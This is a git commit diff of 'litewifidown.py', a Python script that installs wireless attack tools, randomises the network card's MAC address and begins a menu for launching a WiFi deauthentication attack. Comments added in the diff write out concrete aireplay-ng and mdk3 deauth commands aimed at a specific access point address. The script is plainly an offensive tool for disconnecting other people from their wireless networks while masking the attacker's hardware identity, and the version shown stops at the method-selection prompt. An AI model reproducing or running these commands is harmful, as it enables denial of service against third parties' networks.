8ab1eacdc181b8ca82aeec92f12f9f76b4ea7be4
Alan Ramalho <ramalho.sit@gmail.com>
2018-11-19 20:10:28 -0200

    Update litewifidown.py

--- litewifidown.py
+++ litewifidown.py
@@ -1,7 +1,11 @@
-
 import os
 import sys
 import string
+
+#########################
+#aireplay-ng -0 0 -a CC:B2:55:FD:41:DA wlan0mon
+#mdk3 wlan0mon d -n "Hooop"
+###########################
 
 
 print("Check dependencies: ")
@@ -11,7 +15,6 @@ os.system('test /usr/bin/python  && echo "[+] Python ok" || apt-get -y install p
 os.system('test /usr/bin/mdk3 && echo "[+] Mdk3 ok" || apt-get -y install mdk3')
 os.system('test /usr/bin/aircrack-ng && echo "[+] Aircrack-ng ok" || apt-get -y install aircrack-ng')
 os.system('test /usr/bin/macchanger && echo "[+] MacChanger ok" || apt-get -y install macchanger')
-os.system('test /usr/bin/screen && echo "[+] Screen ok" || apt-get -y install screen')
 print("")
 
 print("Listing Wireless extensions: ")
@@ -24,3 +27,9 @@ print("")
 
 print("Changing the mac addrrs: ")
 os.system('card=`cat card.sh` && ifconfig $card down && macchanger -r $card && ifconfig $card up')
+print("")
+
+print("Chose the way for deauth attack: ")
+os.system('test /usr/bin/mdk3 && echo "1: [+] Mdk3 ok" || echo "1: [!] Mdk3 off"')
+os.system('test /usr/bin/aircrack-ng && echo "2: [+] Aircrack-ng ok" || echo "1: [!] Aireplay-ng off"')
+way= raw_input("Please Select or install manualy if your choose is off!: ")
